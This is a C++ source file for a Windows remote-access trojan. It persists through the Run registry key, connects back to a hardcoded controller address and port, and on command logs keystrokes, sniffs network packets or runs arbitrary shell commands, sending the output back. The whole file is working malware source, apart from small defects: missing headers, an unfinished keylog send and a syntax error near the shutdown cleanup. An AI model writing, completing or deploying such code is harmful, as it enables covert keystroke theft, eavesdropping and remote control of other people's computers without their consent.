#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <windows.h>
#include <chrono>
#include <codecvt>
#include <pcap.h> // Include pcap library

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "wpcap.lib") // Link against WinPcap/Npcap library

#define DEFAULT_BUFLEN 2048

bool AddToStartup() {
    wchar_t exePath[MAX_PATH];
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) {
        std::wcerr << L"Failed to get module file name." << std::endl;
        return false;
    }

    HKEY hkey = NULL;
    LONG status = RegOpenKeyExW(HKEY_CURRENT_USER,
                                L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                0,
                                KEY_WRITE,
                                &hkey);
    if (status != ERROR_SUCCESS) {
        std::wcerr << L"Failed to open registry key." << std::endl;
        return false;
    }

    status = RegSetValueExW(hkey,
                            L"MyClientApp", // Change this to your app's name
                            0,
                            REG_SZ,
                            (const BYTE*)exePath,
                            (wcslen(exePath) + 1) * sizeof(wchar_t));

    RegCloseKey(hkey);
    return status == ERROR_SUCCESS;
}


std::wstring LogKeysForDuration() {
    std::wstring loggedKeys;
    auto startTime = std::chrono::steady_clock::now();
    
    while (true) {
        // Check if duration has elapsed
        auto currentTime = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(currentTime - startTime).count();
        if (elapsed >= 30) break;

        for (int key = 1; key <= 254; key++) {
            SHORT keyState = GetAsyncKeyState(key);
            if (keyState & 0x0001) { // Key state changed since last call
                WCHAR charBuffer[5] = {0};
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);

                // Handle Caps Lock as a toggled state
                if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
                    keyboardState[VK_CAPITAL] = 0x01;
                }

                int charsCopied = ToUnicode(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, charBuffer, 4, 0);
                if (charsCopied == 1) {
                    // Append character to the logged string
                    loggedKeys += charBuffer[0];
                } else if (key == VK_SPACE) {
                    loggedKeys += L' '; // Append space directly
                } else if (key == VK_TAB) {
                    loggedKeys += L"    "; // Append tab as four spaces
                } else if (key == VK_RETURN) {
                    loggedKeys += L'\n'; // Append newline for Enter key
                }
                // Add more cases as needed
            }
        }

        Sleep(10); // Reduce CPU usage
    }

    return loggedKeys;
}


std::string execCommand(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}


std::string sniffPacketsForDuration() {
    std::string capturedData;
    pcap_t *handle; // Handle for the session
    char errbuf[PCAP_ERRBUF_SIZE]; // Error string
    struct bpf_program fp; // Compiled filter
    char filter_exp[] = "ip"; // Filter expression
    bpf_u_int32 mask; // Subnet mask
    bpf_u_int32 net; // IP

    // Define the device to sniff on
    char *dev = pcap_lookupdev(errbuf);
    if (dev == nullptr) {
        std::cerr << "Couldn't find default device: " << errbuf << std::endl;
        return "";
    }

    // Find network number and mask based on the device
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        std::cerr << "Couldn't get netmask for device " << dev << ": " << errbuf << std::endl;
        net = 0;
        mask = 0;
    }

    // Open the session in promiscuous mode
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        std::cerr << "Couldn't open device " << dev << ": " << errbuf << std::endl;
        return "";
    }

    // Compile and apply the filter
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
        std::cerr << "Couldn't parse filter " << filter_exp << ": " << pcap_geterr(handle) << std::endl;
        return "";
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        std::cerr << "Couldn't install filter " << filter_exp << ": " << pcap_geterr(handle) << std::endl;
        return "";
    }

    auto startTime = std::chrono::steady_clock::now();

    while (true) {
        // Check if duration has elapsed
        auto currentTime = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(currentTime - startTime).count();
        if (elapsed >= 30) break;

        struct pcap_pkthdr header; // The header that pcap gives us
        const u_char *packet; // The actual packet

        // Capture a packet
        packet = pcap_next(handle, &header);

        // Process the packet
        if (packet != nullptr) {
            // Process packet data and append to capturedData string
            // For simplicity, we're just appending the packet length here
            capturedData += "Packet length: " + std::to_string(header.len) + "\n";
        }
    }

    // Close the session
    pcap_close(handle);
    return capturedData;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AddToStartup();

    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    char sendbuf[DEFAULT_BUFLEN];
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        std::cout << "WSAStartup failed: " << iResult << std::endl;
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo("127.0.0.1", "6969", &hints, &result);
    if (iResult != 0) {
        std::cout << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        return 1;
    }

    // Attempt to connect to the first address returned by the call to getaddrinfo
    ptr = result;
    while (true) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            std::cout << "Error at socket(): " << WSAGetLastError() << std::endl;
            freeaddrinfo(result);
            WSACleanup();
            return 1;
        }

        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            std::cout << "Connection failed, retrying in 5 seconds...\n";
            Sleep(5000);
        } else {
            break;
        }
    }

    freeaddrinfo(result);

    // Receive and send data
    do {
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            std::string command(recvbuf, iResult);

            if (command == "hello") {
                strcpy_s(sendbuf, "world");
                send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
            }
            else if (command == "keylog") {
                std::wstring wstr = LogKeysForDuration();
                // Convert wstring to string and send
                // ...
            }
            else if (command == "sniff") {
                std::string packetData = sniffPacketsForDuration();
                strcpy_s(sendbuf, packetData.c_str());
                send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
            }
            else {
                std::string output = execCommand(command.c_str());
                strcpy_s(sendbuf, output.c_str());
                send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
            }
        } else if (iResult == 0) {
            std::cout << "Connection closed" << std::endl;
        } else {
            std::cout << "recv failed: " << WSAGetLastError() << std::endl;
        }
    } while (iResult > 0);

    // Shutdown the connection
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        std::cout << "shutdown failed: " << WSAGetLastError() << std::endl;
        closesocket(ConnectSocket);
        WSACleanup
        }

    // Cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}
